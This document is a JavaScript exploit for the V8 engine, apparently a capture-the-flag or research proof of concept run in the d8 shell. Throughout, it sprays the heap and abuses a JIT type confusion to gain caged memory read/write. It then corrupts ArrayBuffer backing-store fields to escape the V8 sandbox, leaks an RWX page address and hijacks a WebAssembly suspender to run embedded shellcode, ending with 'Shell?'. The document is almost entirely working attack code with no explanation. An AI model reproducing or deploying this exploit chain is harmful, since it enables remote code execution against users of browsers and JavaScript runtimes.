// --expose-externalize-string

const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

const EMPTY_PROPERTIES_ADDR = 0x7bdn;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x100cf41n;
const FIXED_ARRAY = 0x38c002an;
let FIXED_OBJ_ARRAY = 0x8900018n;

function shellcode() {
  const code = [0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 1, 7, 19, 2, 7, 116, 114, 105, 103, 103, 101, 114, 0, 0, 5, 115, 104, 101, 108, 108, 0, 1, 10, 159, 1, 2, 3, 0, 1, 11, 152, 1, 0, 65, 0, 66, 144, 145, 165, 164, 173, 141, 218, 245, 9, 55, 3, 0, 65, 1, 66, 144, 241, 190, 145, 150, 205, 219, 245, 6, 55, 3, 0, 65, 2, 66, 144, 245, 190, 153, 135, 141, 192, 245, 6, 55, 3, 0, 65, 3, 66, 144, 161, 162, 138, 172, 156, 200, 245, 6, 55, 3, 0, 65, 4, 66, 144, 161, 162, 202, 128, 154, 212, 245, 6, 55, 3, 0, 65, 5, 66, 144, 145, 165, 188, 158, 198, 253, 245, 6, 55, 3, 0, 65, 6, 66, 144, 161, 218, 210, 134, 193, 215, 245, 6, 55, 3, 0, 65, 7, 66, 144, 161, 162, 138, 224, 220, 213, 245, 6, 55, 3, 0, 65, 8, 66, 144, 145, 165, 180, 158, 198, 244, 245, 6, 55, 3, 0, 65, 9, 66, 144, 213, 237, 193, 245, 161, 193, 245, 6, 55, 3, 0, 11]
  const m = new WebAssembly.Module(new Uint8Array(code));
  const instance = new WebAssembly.Instance(m);
  instance.exports.trigger();
  instance.exports.shell();
  return instance;
}

let instance = null;

function itof(x) {
  conv_u64[0] = BigInt(x);
  return conv_f64[0];
}

function ftoi(x) {
  conv_f64[0] = x;
  return conv_u64[0];
}

const spray = new Array(0x4fe0000/8); //FixedDoubleArray address should be constant
spray[2] = itof(MAP_JSARR_PACKED_DOUBLES_ADDR << 8n);
spray[3] = itof(0x41414141ffn);

function make_heapnum(v) {
  const a = [1.1];
  a[0] = v;
  return a[0];
}
  
const H0 = make_heapnum(1.0);
const H1 = make_heapnum(Number(FIXED_ARRAY) / 2);

function trigger(c, target) {
  let v = c ? H1 : H0;
  
  let y = v + 0.1;

  target.p = v;

  return y;
}

let target = { p: {a: 1} };
target.p = [1.1, 2.2, 3.3];

function get(x) {
  return x.p[0];
}

function set(x, y) {
  x.p[0] = y;
}

for (let i = 0; i < 10000; i++) {
    get(target);
    set(target, 1.1);
}

for (let i = 0; i < 1000; i++) {
trigger(false, target);
}

for (let i = 0; i < spray.length; i++) {
spray[i];
}

trigger(false, target);
trigger(true, target);

function caged_write(x, y) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  const tmp = ftoi(get(target)) & 0xffffffff00000000n;
  set(target, itof(tmp | BigInt(y)));
}

function caged_read(x) {
  spray[3] = itof((BigInt(x)-7n) << 8n);
  return (ftoi(get(target))) & 0xffffffffn;
}

function gc() {
  new ArrayBuffer(1);
  new ArrayBuffer(1);
  new ArrayBuffer(2 ** 30);
}

const spray2 = new Array(0x4fe0000/8); //FixedDoubleArray address should be constant
spray2[0] = spray2;

const marker = caged_read(FIXED_OBJ_ARRAY-8n);

if (marker != 0x5ddn) {
  print("Unexpected marker: " + marker.toString(16));
  FIXED_OBJ_ARRAY = 0x8940018n;
  //%SystemBreak();
  //quit(1);
}

gc();

const val = caged_read(FIXED_ARRAY + 0x26n);
print("Read from 0x" + (FIXED_ARRAY + 0x26n).toString(16) + ": " + val.toString(16));
print("Before spray[7]: ", ftoi(spray[7]).toString(16));

caged_write((FIXED_ARRAY + 0x26n), 0xdeadbeefdeadbeefn);
print("After spray[7]: ", ftoi(spray[7]).toString(16));

function getPtr(obj) {
  spray2[0] = obj;
  return Number(caged_read(FIXED_OBJ_ARRAY)) & 0xffffffff;
}

let sbox_buf = new ArrayBuffer(0x1337);

function hack_sbox() {
  let sbox_buf_addr = getPtr(sbox_buf) & ~1;

  caged_write(sbox_buf_addr + 0x14, 0xe0000000);
  caged_write(sbox_buf_addr + 0x18, 0xffffffff);

  caged_write(sbox_buf_addr + 0x1c, 0xe0000000);
  caged_write(sbox_buf_addr + 0x20, 0xffffffff);

  caged_write(sbox_buf_addr + 0x24, 0x00000000);
  caged_write(sbox_buf_addr + 0x28, 0x00000000);
}
hack_sbox();

let sbox_view = new DataView(sbox_buf);
hread32 = (addr) => sbox_view.getUint32(addr, true);
hwrite32 = (addr, val) => sbox_view.setUint32(addr, val, true);

const tmp = hread32(Number(FIXED_ARRAY + 0x26n));
print("Leaked value: " + tmp.toString(16));
hwrite32(Number(FIXED_ARRAY + 0x26n), 0x41414141);
const tmp2 = hread32(Number(FIXED_ARRAY + 0x26n));
print("After write: " + tmp2.toString(16));

if (tmp2 != 0x41414141 || tmp != 0xdeadbeef) {
  print("Sandbox primitives not working, aborting...");
  quit(1);
}

print("Sandbox primitives ready, starting sbx escape...");

function leak() {
  let str = createExternalizableString("B".repeat(0x10));
  externalizeString(str);

  instance = shellcode();
  
  hwrite32(getPtr(str) + 7, 0xffffffff);

  const freq = new Map();
  const canditates = [];

  for (let i = 0; i<0x5000; i+=8) {
    let out = "";
    for (let j = 7; j >= 0; j--) {
      out += str.charCodeAt(i+j).toString(16).padStart(2, '0');
    }
        
    if (out.slice(13, 16) != "000") continue;
    if (out.slice(0, 4) != "0000") continue;
    if (out.slice(4, 6) == "00") continue;
    if (out == "0000000000000000") continue;
    if (out == "0000000100000000") continue;
    if (out.split("0").length > 10) continue; 
    
    freq.set(out.slice(4, 8), (freq.get(out.slice(4, 8)) || 0) + 1);
        if (freq.get(out.slice(4, 8)) == 1) 
            canditates.push(out);
    }

    for (const c of canditates) {
        if (freq.get(c.slice(4, 8)) != 1) continue;
        return BigInt("0x" + c);
    }
}

const rwx = leak() + 0xa5en;
print("Leaked RWX address: 0x" + rwx.toString(16));

function sbx() {
const kHeapObjectTag = 0x1;
const kJSPromiseReactionsOrResultOffset = 0xc;
const kPromiseReactionFulfillHandlerOffset = 0x10;
const kJSFunctionSharedFunctionInfoOffset = 0x10;
const kSharedFunctionInfoFunctionDataOffset = 0x8;
const kWasmResumeDataTrustedSuspenderOffset = 0x4;

function getField(obj, offset) {
  return hread32(obj + offset - kHeapObjectTag);
}

function setField(obj, offset, value) {
  hwrite32(obj + offset - kHeapObjectTag, value);
}

function get_resume_data(promise) {
  let promise_ptr = getPtr(promise);
  let reaction = getField(promise_ptr, kJSPromiseReactionsOrResultOffset);
  let callback = getField(reaction, kPromiseReactionFulfillHandlerOffset);
  let sfi = getField(callback, kJSFunctionSharedFunctionInfoOffset);
  return getField(sfi, kSharedFunctionInfoFunctionDataOffset);
}

function get_suspender(resume_data) {
  return getField(resume_data, kWasmResumeDataTrustedSuspenderOffset);
}

function set_suspender(resume_data, suspender) {
  setField(resume_data, kWasmResumeDataTrustedSuspenderOffset, suspender);
}

const wasm_bytes = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x03, 0x60,
  0x00, 0x00, 0x60, 0x00, 0x00, 0x60, 0x00, 0x00, 0x02, 0x27, 0x03, 0x01,
  0x6d, 0x08, 0x73, 0x75, 0x73, 0x70, 0x65, 0x6e, 0x64, 0x30, 0x00, 0x00,
  0x01, 0x6d, 0x08, 0x73, 0x75, 0x73, 0x70, 0x65, 0x6e, 0x64, 0x31, 0x00,
  0x01, 0x01, 0x6d, 0x07, 0x63, 0x6f, 0x72, 0x72, 0x75, 0x70, 0x74, 0x00,
  0x02, 0x07, 0x21, 0x03, 0x08, 0x73, 0x75, 0x73, 0x70, 0x65, 0x6e, 0x64,
  0x30, 0x00, 0x00, 0x08, 0x73, 0x75, 0x73, 0x70, 0x65, 0x6e, 0x64, 0x31,
  0x00, 0x01, 0x07, 0x63, 0x6f, 0x72, 0x72, 0x75, 0x70, 0x74, 0x00, 0x02,
]);

let module = new WebAssembly.Module(wasm_bytes);

let resolve0;
let promises = [
  new Promise(r => { resolve0 = r; }),
  new Promise(r => setTimeout(r, 0))
];

let suspend0 = new WebAssembly.Suspending(() => promises[0]);
let suspend1 = new WebAssembly.Suspending(() => promises[1]);

function corrupt() {
  set_suspender(
      get_resume_data(promises[0]),
      get_suspender(get_resume_data(promises[1])));
}

let instance = new WebAssembly.Instance(module, {
  m: {
    suspend0: suspend0,
    suspend1: suspend1,
    corrupt: corrupt
  }
});

WebAssembly.promising(instance.exports.suspend0)();
WebAssembly.promising(instance.exports.suspend1)()
  .then(v => {
    gc();
    gc();

    let save = [];
    const view = new DataView(conv_ab);
    conv_u64[0] = rwx;
    let rwx_string = "";
    for (let i = 0; i < 8; i++)
      rwx_string += String.fromCharCode(view.getUint8(i));

    x = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa" + rwx_string + "maaanaaa\0\0\0\0\0\0\0\0qaaa\x01\0\0\0saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaab"
    for (let i = 0; i < 0x1000; i++) {      
      save.push(createExternalizableString(x));
      externalizeString(save[i]);
    }

    print("Shell?");
    resolve0();
  });
instance.exports.corrupt();
}

sbx();